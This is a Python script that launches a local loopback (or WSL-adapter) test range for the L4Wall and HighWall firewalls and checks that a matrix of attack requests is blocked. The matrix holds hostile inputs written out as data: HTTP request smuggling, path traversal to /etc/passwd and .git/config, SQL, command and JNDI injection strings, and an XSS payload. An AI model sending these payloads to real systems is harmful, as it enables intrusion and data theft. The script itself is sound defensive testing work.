#!/usr/bin/env python3
"""Launch a local attack range and optionally run a live matrix.

Topology::

    attack client -> L4Wall -> HighWall -> range upstream

The range uses real subprocesses for L4Wall and HighWall, ephemeral ports, and
a local stub upstream. By default everything binds to 127.0.0.1. With --wsl,
only the L4 edge binds to the host-side WSL virtual adapter so a WSL attacker
can reach it; HighWall and the upstream stay on loopback. It never binds a
physical LAN/public interface, scans an external host, or changes firewall or
network configuration.

Examples::

    python scripts/attack_range.py
    python scripts/attack_range.py --serve
    python scripts/attack_range.py --wsl --serve --wsl-distro Ubuntu
    python scripts/attack_range.py --out reports/my-range
"""

from __future__ import annotations

import argparse
import contextlib
import ipaddress
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
L4_ROOT = ROOT / "subprojects" / "l4wall"
if str(L4_ROOT) not in sys.path:
    sys.path.insert(0, str(L4_ROOT))

from l4wall.config import example_config as l4_example_config  # noqa: E402

HOST = "test.local"
ORIGIN = "https://test.local"
WSL_EDGE_PORT = 18080


@dataclass(frozen=True)
class WslNetwork:
    distro: str
    host: str
    network: ipaddress.IPv4Network


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def free_port(host: str = "127.0.0.1") -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, 0))
        return int(sock.getsockname()[1])


def build_request(
    method: str = "GET",
    path: str = "/",
    *,
    host: str | None = HOST,
    headers: list[tuple[str, str]] | None = None,
    body: bytes = b"",
    version: str = "HTTP/1.1",
) -> bytes:
    lines = [f"{method} {path} {version}"]
    if host is not None:
        lines.append(f"Host: {host}")
    if headers:
        lines.extend(f"{name}: {value}" for name, value in headers)
    if body or method in {"POST", "PUT", "PATCH"}:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + body


def exchange(
    port: int,
    payload: bytes,
    *,
    timeout: float = 3.0,
    address: str = "127.0.0.1",
) -> tuple[bytes, str]:
    error = ""
    try:
        with socket.create_connection((address, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(payload)
            with contextlib.suppress(OSError):
                sock.shutdown(socket.SHUT_WR)
            chunks: list[bytes] = []
            while True:
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    error = "timed out waiting for response"
                    break
                if not chunk:
                    break
                chunks.append(chunk)
            return b"".join(chunks), error
    except OSError as exc:
        return b"", str(exc)


def connection_closed(raw: bytes, error: str) -> bool:
    """Treat a reset/refusal with no HTTP bytes as a connection-layer reject."""
    if raw:
        return False
    lowered = error.lower()
    return "timed out" not in lowered and "timeout" not in lowered


def _wsl_output(distro: str, script: str) -> str:
    completed = subprocess.run(
        ["wsl.exe", "-d", distro, "-e", "sh", "-lc", script],
        capture_output=True,
        timeout=15,
        check=False,
    )
    if completed.returncode != 0:
        detail = completed.stderr.decode("utf-8", errors="replace").strip()
        raise RuntimeError(f"WSL distro {distro!r} failed: {detail}")
    return completed.stdout.decode("utf-8", errors="replace").strip()


def detect_wsl_network(distro: str) -> WslNetwork:
    errors: list[str] = []
    candidates = [name for name in (distro, "Ubuntu", "Debian") if name]
    for probe_distro in dict.fromkeys(candidates):
        try:
            address = _wsl_output(
                probe_distro,
                "ip -4 -o addr show dev eth0 | awk '{print $4; exit}'",
            )
            gateway = _wsl_output(probe_distro, "ip route show default | awk '{print $3; exit}'")
            network = ipaddress.ip_network(address, strict=False)
            host = ipaddress.ip_address(gateway)
        except (RuntimeError, ValueError) as exc:
            errors.append(f"{probe_distro}: {exc}")
            continue
        if not isinstance(network, ipaddress.IPv4Network) or not isinstance(host, ipaddress.IPv4Address):
            errors.append(f"{probe_distro}: IPv4 network required")
            continue
        if host not in network or not host.is_private:
            errors.append(f"{probe_distro}: refusing non-private/mismatched target {host} in {network}")
            continue
        return WslNetwork(distro=probe_distro, host=str(host), network=network)
    raise RuntimeError("cannot detect a private WSL IPv4 network: " + "; ".join(errors))


def wsl_exchange(wsl: WslNetwork, port: int, *, host_header: str = HOST, timeout: float = 10.0) -> tuple[bytes, str]:
    script = (
        f"exec 3<>/dev/tcp/{wsl.host}/{port} || exit 7\n"
        f"printf 'GET / HTTP/1.1\\r\\nHost: {host_header}\\r\\nConnection: close\\r\\n\\r\\n' >&3\n"
        "IFS= read -r -t 5 line <&3 || exit 8\n"
        "printf '%s\\r\\n\\r\\n' \"$line\"\n"
        "exec 3<&-; exec 3>&-\n"
    )
    try:
        completed = subprocess.run(
            ["wsl.exe", "-d", wsl.distro, "-e", "bash", "-lc", script],
            capture_output=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return b"", "WSL request timed out"
    raw = completed.stdout
    marker = raw.find(b"HTTP/")
    if marker >= 0:
        raw = raw[marker:]
    error = completed.stderr.decode("utf-8", errors="replace").strip() if not raw else ""
    if not raw and completed.returncode == 8:
        error = "WSL response timed out"
    return raw, error


def parse_response(raw: bytes) -> tuple[int | None, list[tuple[str, str]], bytes]:
    head, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        return None, [], body
    lines = head.split(b"\r\n")
    if not lines or len(lines[0].split(b" ", 2)) < 2:
        return None, [], body
    try:
        status = int(lines[0].split(b" ", 2)[1])
    except (ValueError, IndexError):
        return None, [], body
    headers: list[tuple[str, str]] = []
    for line in lines[1:]:
        name, colon, value = line.partition(b":")
        if colon:
            headers.append((name.decode("latin-1"), value.strip().decode("latin-1")))
    return status, headers, body


def header_value(headers: list[tuple[str, str]], name: str) -> str | None:
    lowered = name.lower()
    for key, value in headers:
        if key.lower() == lowered:
            return value
    return None


def write_json(path: Path, payload: Any) -> None:
    path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")


class _UpstreamHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, format: str, *args: Any) -> None:
        return

    def _handle(self) -> None:
        length = int(self.headers.get("Content-Length", "0") or "0")
        body = self.rfile.read(length) if length else b""
        path = self.path.split("?", 1)[0]
        owner: RangeUpstream = self.server.owner  # type: ignore[attr-defined]
        owner.record(
            {
                "method": self.command,
                "path": self.path,
                "headers": list(self.headers.items()),
                "body": body[:4096].decode("latin-1", errors="replace"),
            }
        )
        status = 200
        if path == "/leak-secret":
            payload = b"debug dump\n-----BEGIN RSA PRIVATE KEY-----\nMIIBogIBAAJBAK\n"
        elif path == "/leak-debug":
            payload = b'Traceback (most recent call last):\n  File "app.py", line 1, in <module>\n'
        elif path == "/slow":
            time.sleep(0.4)
            payload = b'{"slow":true}'
        else:
            payload = json.dumps(
                {
                    "method": self.command,
                    "path": self.path,
                    "host": self.headers.get("Host"),
                    "xff": self.headers.get("X-Forwarded-For"),
                    "body": body.decode("latin-1", errors="replace"),
                },
                ensure_ascii=True,
            ).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("X-Range-Upstream", "1")
        self.send_header("Connection", "close")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(payload)

    do_GET = _handle
    do_HEAD = _handle
    do_POST = _handle


class RangeUpstream:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        self._lock = threading.Lock()
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), _UpstreamHandler)
        self.server.daemon_threads = True
        self.server.owner = self  # type: ignore[attr-defined]
        self.port = int(self.server.server_address[1])
        self._thread = threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True)

    def start(self) -> None:
        self._thread.start()

    def stop(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self._thread.join(timeout=2.0)

    def record(self, item: dict[str, Any]) -> None:
        with self._lock:
            self.requests.append(item)

    def snapshot(self) -> list[dict[str, Any]]:
        with self._lock:
            return list(self.requests)


@dataclass
class CaseResult:
    name: str
    layer: str
    expected: str
    actual: str
    passed: bool
    detail: str = ""
    kind: str = "check"


@dataclass
class RangeConfig:
    run_dir: Path
    edge_host: str
    wsl: WslNetwork | None
    upstream_port: int
    highwall_port: int
    l4_port: int
    highwall_config: Path
    l4_config: Path
    highwall_audit: Path
    l4_audit: Path
    l4_offenders: Path


def _highwall_config(run_dir: Path, upstream_port: int) -> tuple[Path, int]:
    data = json.loads((ROOT / "config.example.json").read_text(encoding="utf-8"))
    port = free_port()
    data["server"]["listen_host"] = "127.0.0.1"
    data["server"]["listen_port"] = port
    data["server"]["shutdown_timeout"] = 5.0
    data["upstream"]["host"] = "127.0.0.1"
    data["upstream"]["port"] = upstream_port
    data["upstream"]["read_timeout"] = 5.0
    data["policy"]["allowed_hosts"] = [HOST]
    data["policy"]["allowed_client_networks"] = ["127.0.0.1/32"]
    data["policy"]["allowed_origins"] = [ORIGIN]
    data["policy"]["honeypot"]["enabled"] = False
    data["policy"]["honeypot"]["presets"] = []
    data["rate_limit"]["enabled"] = True
    data["rate_limit"]["per_ip_rate"] = 50.0
    data["rate_limit"]["per_ip_burst"] = 100
    data["rate_limit"]["global_rate"] = 1000.0
    data["rate_limit"]["global_burst"] = 2000
    data["rate_limit"]["auto_ban_threshold"] = 0
    data["threat_detection"]["enabled"] = True
    data["threat_detection"]["mode"] = "monitor"
    data["threat_detection"]["agent_mode"] = "score"
    data["threat_detection"]["offender_path"] = str(run_dir / "highwall-offenders.json")
    data["ddos_detection"]["enabled"] = False
    data["audit"]["path"] = str(run_dir / "highwall-audit.jsonl")
    data["audit"]["path_mode"] = "exact"
    data["admin"]["enabled"] = False
    path = run_dir / "highwall-config.json"
    write_json(path, data)
    return path, port


def _l4_config(
    run_dir: Path,
    upstream_port: int,
    *,
    bind_host: str = "127.0.0.1",
    allowed_networks: list[str] | None = None,
    listen_port: int | None = None,
) -> tuple[Path, int]:
    data = l4_example_config()
    data["server"]["listen_host"] = bind_host
    data["server"]["max_connections"] = 128
    data["server"]["max_connections_per_ip"] = 64
    data["server"]["shutdown_timeout"] = 3.0
    listener = data["listeners"][0]
    listener.update(
        {
            "name": "web",
            "listen_port": listen_port if listen_port is not None else free_port(bind_host),
            "upstream_host": "127.0.0.1",
            "upstream_port": upstream_port,
            "allowed_client_networks": allowed_networks or ["127.0.0.1/32"],
            "denied_client_networks": [],
            "connect_timeout": 2.0,
            "first_byte_timeout": 5.0,
            "idle_timeout": 15.0,
            "max_connection_seconds": 30.0,
            "max_bytes_per_direction": 2097152,
            "max_connections_per_ip": 32,
            "new_connections_per_second": 100.0,
            "new_connections_burst": 200,
            "read_chunk_bytes": 65536,
        }
    )
    data["listeners"] = [listener]
    threat = data["threat_detection"]
    threat.update(
        {
            "enabled": True,
            "mode": "block",
            "window_seconds": 30.0,
            "min_connections": 100,
            "min_distinct_listeners": 2,
            "min_short_connections": 99,
            "min_zero_byte_connections": 3,
            "min_rejections": 99,
            "agent_min_signals": 2,
            "agent_score": 20,
            "score_threshold": 15,
            "confirm_score": 15,
            "confirm_after_seconds": 1.0,
            "confirmed_containment_seconds": 120.0,
            "mark_ttl_seconds": 120.0,
            "offender_path": str(run_dir / "l4-offenders.json"),
        }
    )
    threat["shared_bans"]["enabled"] = False
    data["audit"]["path"] = str(run_dir / "l4-audit.jsonl")
    data["admin"]["enabled"] = False
    data["metrics"]["enabled"] = True
    path = run_dir / "l4-config.json"
    write_json(path, data)
    return path, int(listener["listen_port"])


class RangeProcess:
    def __init__(self, name: str, command: list[str], cwd: Path, log_path: Path) -> None:
        self.name = name
        self.log_path = log_path
        self._log = log_path.open("wb")
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if os.name == "nt" else 0
        env = dict(os.environ)
        env["PYTHONUNBUFFERED"] = "1"
        self.proc = subprocess.Popen(
            command,
            cwd=str(cwd),
            stdout=self._log,
            stderr=subprocess.STDOUT,
            creationflags=flags,
            env=env,
        )

    @property
    def alive(self) -> bool:
        return self.proc.poll() is None

    def tail(self, limit: int = 2000) -> str:
        self._log.flush()
        try:
            text = self.log_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return ""
        return text[-limit:]

    def fail_if_dead(self) -> None:
        if not self.alive:
            raise RuntimeError(f"{self.name} exited with {self.proc.returncode}: {self.tail()}")

    def stop(self) -> None:
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5.0)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                self.proc.wait(timeout=5.0)
        self._log.close()


def wait_http(
    port: int,
    process: RangeProcess,
    *,
    timeout: float = 10.0,
    address: str = "127.0.0.1",
) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        process.fail_if_dead()
        raw, error = exchange(port, build_request(path="/"), address=address)
        status, _, _ = parse_response(raw)
        if status == 200:
            return
        time.sleep(0.05)
    raise RuntimeError(f"{process.name} did not become healthy on {address}:{port}: {error}: {process.tail()}")


def wait_wsl_http(wsl: WslNetwork, port: int, process: RangeProcess, *, timeout: float = 10.0) -> None:
    deadline = time.monotonic() + timeout
    error = ""
    while time.monotonic() < deadline:
        process.fail_if_dead()
        raw, error = wsl_exchange(wsl, port)
        status, _, _ = parse_response(raw)
        if status == 200:
            return
        time.sleep(0.1)
    raise RuntimeError(
        f"{process.name} is not reachable from WSL distro {wsl.distro!r} at "
        f"{wsl.host}:{port}: {error}: {process.tail()}"
    )


def _status_text(status: int | None, error: str) -> str:
    if status is not None:
        return str(status)
    if error:
        return f"closed ({error})"
    return "closed"


class CaseRunner:
    def __init__(
        self,
        l4_port: int,
        highwall_port: int,
        upstream: RangeUpstream,
        *,
        edge_host: str = "127.0.0.1",
    ) -> None:
        self.l4_port = l4_port
        self.highwall_port = highwall_port
        self.upstream = upstream
        self.edge_host = edge_host
        self.results: list[CaseResult] = []

    def _case(
        self,
        *,
        name: str,
        layer: str,
        port: int,
        payload: bytes,
        expected: set[int] | str,
        upstream_effect: str | None = None,
        detail: str = "",
    ) -> CaseResult:
        before = len(self.upstream.snapshot())
        raw, error = exchange(port, payload, address=self.edge_host)
        status, headers, body = parse_response(raw)
        after = len(self.upstream.snapshot())
        actual = _status_text(status, error)
        if expected == "closed":
            ok = status is None and connection_closed(raw, error)
        else:
            assert isinstance(expected, set)
            ok = status in expected
        if upstream_effect == "unchanged":
            ok = ok and after == before
        elif upstream_effect == "incremented":
            ok = ok and after == before + 1
        if status is not None and error:
            detail = f"{detail}; {error}".strip("; ")
        result = CaseResult(
            name=name,
            layer=layer,
            expected="closed" if expected == "closed" else "/".join(str(item) for item in sorted(expected)),
            actual=actual,
            passed=ok,
            detail=detail,
            kind="check",
        )
        self.results.append(result)
        return result

    def blocked(
        self,
        name: str,
        layer: str,
        payload: bytes,
        expected: set[int],
        *,
        upstream_effect: str = "unchanged",
    ) -> CaseResult:
        return self._case(
            name=name,
            layer=layer,
            port=self.l4_port,
            payload=payload,
            expected=expected,
            upstream_effect=upstream_effect,
        )

    def allowed(self, name: str, layer: str, payload: bytes, expected: set[int]) -> tuple[CaseResult, list[tuple[str, str]], bytes]:
        before = len(self.upstream.snapshot())
        raw, error = exchange(self.l4_port, payload, address=self.edge_host)
        status, headers, body = parse_response(raw)
        after = len(self.upstream.snapshot())
        actual = _status_text(status, error)
        ok = status in expected and after == before + 1
        result = CaseResult(name, layer, "/".join(str(item) for item in sorted(expected)), actual, ok, kind="check")
        self.results.append(result)
        return result, headers, body

    def risk(self, name: str, layer: str, port: int, payload: bytes, expected: set[int]) -> None:
        raw, error = exchange(port, payload)
        status, _, _ = parse_response(raw)
        actual = _status_text(status, error)
        self.results.append(
            CaseResult(
                name=name,
                layer=layer,
                expected="/".join(str(item) for item in sorted(expected)),
                actual=actual,
                passed=status in expected,
                detail="expected lite-range bypass; production must block this with network isolation",
                kind="risk",
            )
        )


def run_matrix(runner: CaseRunner) -> None:
    runner.allowed("normal request", "L7", build_request(path="/"), {200})
    runner.blocked("wrong Host", "L7", build_request(path="/", host="evil.local"), {403})
    runner.blocked(
        "absolute URI",
        "L7",
        b"GET http://evil.local/ HTTP/1.1\r\nHost: test.local\r\n\r\n",
        {400},
    )
    runner.blocked("duplicate Host", "L7", build_request(headers=[("Host", HOST)]), {400})
    runner.blocked(
        "duplicate Content-Length",
        "L7",
        b"POST / HTTP/1.1\r\nHost: test.local\r\nContent-Type: text/plain\r\n"
        b"Content-Length: 1\r\nContent-Length: 1\r\n\r\nA",
        {400},
    )
    runner.blocked(
        "CL and TE smuggling",
        "L7",
        b"POST / HTTP/1.1\r\nHost: test.local\r\nContent-Type: text/plain\r\n"
        b"Content-Length: 1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
        {400},
    )
    for path in ("/a/../b", "/%2e%2e/etc/passwd", "/a%2fb", "/a%00b", "/.git/config"):
        runner.blocked(f"path traversal {path}", "L7", build_request(path=path), {400, 403})
    for name, path in (
        ("SQL injection", "/?q=%27%20OR%201%3D1"),
        ("command injection", "/?q=%3Bsh"),
        ("JNDI injection", "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D"),
    ):
        runner.blocked(name, "L7", build_request(path=path), {403})
    runner.blocked(
        "XSS in JSON body",
        "L7",
        build_request(
            method="POST",
            headers=[("Content-Type", "application/json")],
            body=b'{"comment":"<script>alert(1)</script>"}',
        ),
        {403},
    )
    runner.blocked(
        "GET body",
        "L7",
        build_request(method="GET", headers=[("Content-Type", "text/plain")], body=b"A"),
        {400},
    )
    runner.blocked(
        "oversized body",
        "L7",
        b"POST / HTTP/1.1\r\nHost: test.local\r\nContent-Type: text/plain\r\nContent-Length: 2000000\r\n\r\n",
        {413},
    )
    long_headers = [(f"X-Long-{index}", "a" * 800) for index in range(24)]
    runner.blocked("oversized header block", "L7", build_request(headers=long_headers), {431})
    runner.blocked(
        "CSRF missing Origin",
        "L7",
        build_request(
            method="POST",
            headers=[("Content-Type", "application/json")],
            body=b"{}",
        ),
        {403},
    )
    runner.blocked(
        "CSRF wrong Origin",
        "L7",
        build_request(
            method="POST",
            headers=[("Content-Type", "application/json"), ("Origin", "https://evil.test")],
            body=b"{}",
        ),
        {403},
    )
    runner.allowed(
        "CSRF correct Origin",
        "L7",
        build_request(
            method="POST",
            headers=[("Content-Type", "application/json"), ("Origin", ORIGIN)],
            body=b"{}",
        ),
        {200},
    )
    xff_result, _, _ = runner.allowed(
        "spoofed X-Forwarded-For",
        "L7",
        build_request(path="/", headers=[("X-Forwarded-For", "203.0.113.9")]),
        {200},
    )
    last = runner.upstream.snapshot()[-1] if runner.upstream.snapshot() else {}
    xff = next((value for name, value in last.get("headers", []) if name.lower() == "x-forwarded-for"), None)
    if not xff_result.passed or xff != "127.0.0.1":
        xff_result.passed = False
        xff_result.detail = f"upstream xff={xff!r}"
    runner.blocked(
        "private key DLP",
        "L7",
        build_request(path="/leak-secret"),
        {502},
        upstream_effect="incremented",
    )
    runner.blocked(
        "debug trace DLP",
        "L7",
        build_request(path="/leak-debug"),
        {502},
        upstream_effect="incremented",
    )

    runner.risk("direct HighWall access", "boundary", runner.highwall_port, build_request(path="/"), {200})
    runner.risk(
        "direct upstream access",
        "boundary",
        runner.upstream.port,
        build_request(path="/?q=%27%20OR%201%3D1"),
        {200},
    )

    for _ in range(5):
        with contextlib.suppress(OSError):
            with socket.create_connection((runner.edge_host, runner.l4_port), timeout=2.0):
                pass
        time.sleep(0.05)
    banned = False
    for _ in range(60):
        raw, error = exchange(runner.l4_port, build_request(path="/after-ban"), address=runner.edge_host)
        if connection_closed(raw, error):
            banned = True
            break
        time.sleep(0.05)
    runner.results.append(
        CaseResult(
            name="zero-byte probe ban",
            layer="L4",
            expected="closed",
            actual="closed" if banned else "open",
            passed=banned,
            detail="5 probes against tightened range thresholds",
            kind="check",
        )
    )
    if banned:
        before = len(runner.upstream.snapshot())
        raw, error = exchange(
            runner.l4_port,
            build_request(path="/after-ban-2"),
            address=runner.edge_host,
        )
        after = len(runner.upstream.snapshot())
        rejected = connection_closed(raw, error)
        runner.results.append(
            CaseResult(
                name="post-ban request does not reach upstream",
                layer="L4",
                expected="closed / upstream unchanged",
                actual=_status_text(parse_response(raw)[0], error),
                passed=rejected and after == before,
                detail=f"upstream delta={after - before}",
                kind="check",
            )
        )


def run_wsl_probe(runner: CaseRunner, wsl: WslNetwork) -> None:
    before = len(runner.upstream.snapshot())
    raw, error = wsl_exchange(wsl, runner.l4_port)
    status, _, _ = parse_response(raw)
    after = len(runner.upstream.snapshot())
    runner.results.append(
        CaseResult(
            name="WSL attacker reaches edge",
            layer="WSL",
            expected="200 / upstream incremented",
            actual=_status_text(status, error),
            passed=status == 200 and after == before + 1,
            detail=f"distro={wsl.distro}; target={wsl.host}:{runner.l4_port}",
            kind="check",
        )
    )

    before = len(runner.upstream.snapshot())
    raw, error = wsl_exchange(wsl, runner.l4_port, host_header="evil.local")
    status, _, _ = parse_response(raw)
    after = len(runner.upstream.snapshot())
    runner.results.append(
        CaseResult(
            name="WSL wrong Host is blocked at L7",
            layer="WSL",
            expected="403 / upstream unchanged",
            actual=_status_text(status, error),
            passed=status == 403 and after == before,
            detail=f"distro={wsl.distro}",
            kind="check",
        )
    )


def build_report(
    config: RangeConfig,
    runner: CaseRunner,
    started: str,
    finished: str,
    processes: dict[str, RangeProcess],
) -> dict[str, Any]:
    checks = [item for item in runner.results if item.kind == "check"]
    risks = [item for item in runner.results if item.kind == "risk"]
    failed = [item for item in checks if not item.passed]
    wsl = config.wsl
    bind = "127.0.0.1 only" if wsl is None else f"edge {wsl.host}; HighWall/upstream 127.0.0.1"
    endpoints = {
        "edge": f"http://{config.edge_host}:{config.l4_port}",
        "highwall_direct": f"http://127.0.0.1:{config.highwall_port}",
        "upstream_direct": f"http://127.0.0.1:{config.upstream_port}",
        "host_header": HOST,
    }
    if wsl is not None:
        endpoints["wsl_target"] = f"http://{wsl.host}:{config.l4_port}"
        endpoints["wsl_distro"] = wsl.distro
    return {
        "generated_at": finished,
        "started_at": started,
        "finished_at": finished,
        "platform": platform.platform(),
        "python": platform.python_version(),
        "topology": "client -> L4Wall -> HighWall -> range upstream",
        "bind": bind,
        "endpoints": endpoints,
        "artifacts": {
            "run_dir": str(config.run_dir),
            "highwall_config": str(config.highwall_config),
            "l4_config": str(config.l4_config),
            "highwall_audit": str(config.highwall_audit),
            "l4_audit": str(config.l4_audit),
            "l4_offenders": str(config.l4_offenders),
            "highwall_log": str(processes["highwall"].log_path),
            "l4_log": str(processes["l4"].log_path),
        },
        "summary": {
            "checks": len(checks),
            "passed": len(checks) - len(failed),
            "failed": len(failed),
            "risks": len(risks),
        },
        "results": [item.__dict__ for item in runner.results],
        "limitations": [
            "loopback lite range; not the Docker/HAProxy standard topology",
            "WSL mode uses a host-only virtual adapter; it does not validate a physical-LAN ingress or firewall policy",
            "TLS, HTTP/2, WebSocket, PROXY protocol and real client IP cleaning are not exercised",
            "direct HighWall/upstream access is expected to be reachable in this lite range",
            "L4Wall Controller, shared-ban publisher, multi-node HA and cross-layer request IDs are not implemented",
        ],
    }


def write_markdown(path: Path, report: dict[str, Any]) -> None:
    lines = [
        "# Attack range report",
        "",
        f"- Generated: `{report['generated_at']}`",
        f"- Platform: `{report['platform']}` / Python `{report['python']}`",
        f"- Topology: `{report['topology']}`",
        f"- Bind: `{report['bind']}`",
        "",
        "## Endpoints",
        "",
    ]
    for name, value in report["endpoints"].items():
        lines.append(f"- `{name}`: `{value}`")
    lines.extend(["", "## Results", "", "| Case | Layer | Expected | Actual | Result |", "|---|---|---|---|---|"])
    for item in report["results"]:
        mark = "PASS" if item["passed"] else ("RISK" if item["kind"] == "risk" else "FAIL")
        lines.append(
            f"| {item['name']} | {item['layer']} | {item['expected']} | {item['actual']} | {mark} |"
        )
    summary = report["summary"]
    lines.extend(
        [
            "",
            f"Checks: {summary['passed']}/{summary['checks']} passed, {summary['failed']} failed; boundary risks observed: {summary['risks']}.",
            "",
            "## Artifacts",
            "",
        ]
    )
    for name, value in report["artifacts"].items():
        lines.append(f"- `{name}`: `{value}`")
    lines.extend(["", "## Limitations", ""])
    for item in report["limitations"]:
        lines.append(f"- {item}")
    lines.append("")
    path.write_text("\n".join(lines), encoding="utf-8")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Launch a local L4Wall + HighWall attack range")
    parser.add_argument("--serve", action="store_true", help="start the range and wait for Ctrl+C without running the matrix")
    parser.add_argument("--out", default="", help="report directory (default: reports/attack-range-<timestamp>)")
    parser.add_argument("--wsl", action="store_true", help="expose only the L4 edge on the host-side WSL virtual adapter")
    parser.add_argument(
        "--wsl-distro",
        default="",
        help="WSL distro used for the edge reachability check (default: auto-detect a common distro)",
    )
    args = parser.parse_args(argv)

    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    run_dir = Path(args.out) if args.out else ROOT / "reports" / f"attack-range-{stamp}"
    if not run_dir.is_absolute():
        run_dir = ROOT / run_dir
    if run_dir.exists():
        if not run_dir.is_dir():
            raise RuntimeError(f"report path is not a directory: {run_dir}")
        if any(run_dir.iterdir()):
            raise RuntimeError(f"report directory is not empty; choose a new --out path: {run_dir}")
    run_dir.mkdir(parents=True, exist_ok=True)

    wsl = detect_wsl_network(args.wsl_distro) if args.wsl else None
    edge_host = wsl.host if wsl is not None else "127.0.0.1"
    allowed_networks = ["127.0.0.1/32", str(wsl.network)] if wsl is not None else ["127.0.0.1/32"]

    upstream = RangeUpstream()
    upstream.start()
    highwall_config, highwall_port = _highwall_config(run_dir, upstream.port)
    l4_config, l4_port = _l4_config(
        run_dir,
        highwall_port,
        bind_host=edge_host,
        allowed_networks=allowed_networks,
        listen_port=WSL_EDGE_PORT if wsl is not None else None,
    )
    config = RangeConfig(
        run_dir=run_dir,
        edge_host=edge_host,
        wsl=wsl,
        upstream_port=upstream.port,
        highwall_port=highwall_port,
        l4_port=l4_port,
        highwall_config=highwall_config,
        l4_config=l4_config,
        highwall_audit=run_dir / "highwall-audit.jsonl",
        l4_audit=run_dir / "l4-audit.jsonl",
        l4_offenders=run_dir / "l4-offenders.json",
    )
    highwall = RangeProcess(
        "highwall",
        [sys.executable, "-m", "highwall", "serve", "-c", str(highwall_config)],
        ROOT,
        run_dir / "highwall.log",
    )
    l4 = RangeProcess(
        "l4wall",
        [sys.executable, "-m", "l4wall", "run", "--config", str(l4_config)],
        L4_ROOT,
        run_dir / "l4wall.log",
    )
    processes = {"highwall": highwall, "l4": l4}
    started = utc_now()
    try:
        wait_http(highwall_port, highwall)
        wait_http(l4_port, l4, address=edge_host)
        if wsl is not None:
            wait_wsl_http(wsl, l4_port, l4)
        print(f"Attack range is up (edge on {edge_host})")
        print(f"  edge (L4Wall):   http://{edge_host}:{l4_port}  Host: {HOST}")
        print(f"  direct HighWall: http://127.0.0.1:{highwall_port}")
        print(f"  direct upstream: http://127.0.0.1:{upstream.port}")
        print(f"  artifacts:       {run_dir}")
        if wsl is not None:
            print(f"  WSL target:      http://{wsl.host}:{l4_port}  distro={wsl.distro}")
        if args.serve:
            print("Press Ctrl+C to stop.")
            try:
                while True:
                    time.sleep(1.0)
            except KeyboardInterrupt:
                pass
            return 0

        runner = CaseRunner(l4_port, highwall_port, upstream, edge_host=edge_host)
        run_matrix(runner)
        if wsl is not None:
            run_wsl_probe(runner, wsl)
        finished = utc_now()
        report = build_report(config, runner, started, finished, processes)
        write_json(run_dir / "summary.json", report)
        write_markdown(run_dir / "summary.md", report)
        for item in runner.results:
            marker = "PASS" if item.passed else ("RISK" if item.kind == "risk" else "FAIL")
            print(f"[{marker}] {item.layer:<8} {item.name}: expected {item.expected}, got {item.actual}")
        summary = report["summary"]
        print(
            f"Summary: {summary['passed']}/{summary['checks']} checks passed, "
            f"{summary['failed']} failed, {summary['risks']} boundary risks observed"
        )
        print(f"Report: {run_dir / 'summary.md'}")
        return 0 if summary["failed"] == 0 else 1
    finally:
        for process in (l4, highwall):
            with contextlib.suppress(Exception):
                process.stop()
        with contextlib.suppress(Exception):
            upstream.stop()


if __name__ == "__main__":
    raise SystemExit(main())
